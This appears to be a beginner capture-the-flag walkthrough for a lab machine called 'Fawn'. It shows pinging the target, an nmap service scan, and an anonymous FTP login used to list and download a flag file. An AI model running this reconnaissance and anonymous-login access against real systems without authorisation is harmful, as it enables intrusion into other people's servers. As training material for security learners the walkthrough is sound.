# Fawn

## Verify connectivity to the target

Send an ICMP echo request to confirm that the target is reachable.

Command:

```bash
ping <target_ip>
```

## Find open ports and services running on the target IP

Perform a service scan to identify open ports and running services.

Command:

```bash
nmap -Pn -sV <target_ip>
```

Expected result:

* Port 21: FTP (File Transfer Protocol)

## Display FTP help menu

View available FTP commands and options.

Command:

```bash
ftp -?
```

## Connect to the FTP service

Connect to the target FTP server.

Command:

```bash
ftp <target_ip>
```

## Log in using anonymous authentication

Many FTP servers allow public access through the anonymous account.

Credentials:

```text
Username: anonymous
Password: (leave blank)
```

## Enumerate available files

List the contents of the FTP server.

Command:

```bash
ls
```

## Download the flag file

Retrieve the flag from the FTP server.

Command:

```bash
get flag.txt
```

## Read the flag

Display the contents of the downloaded file.

Command:

```bash
cat flag.txt
```

The flag is successfully obtained.
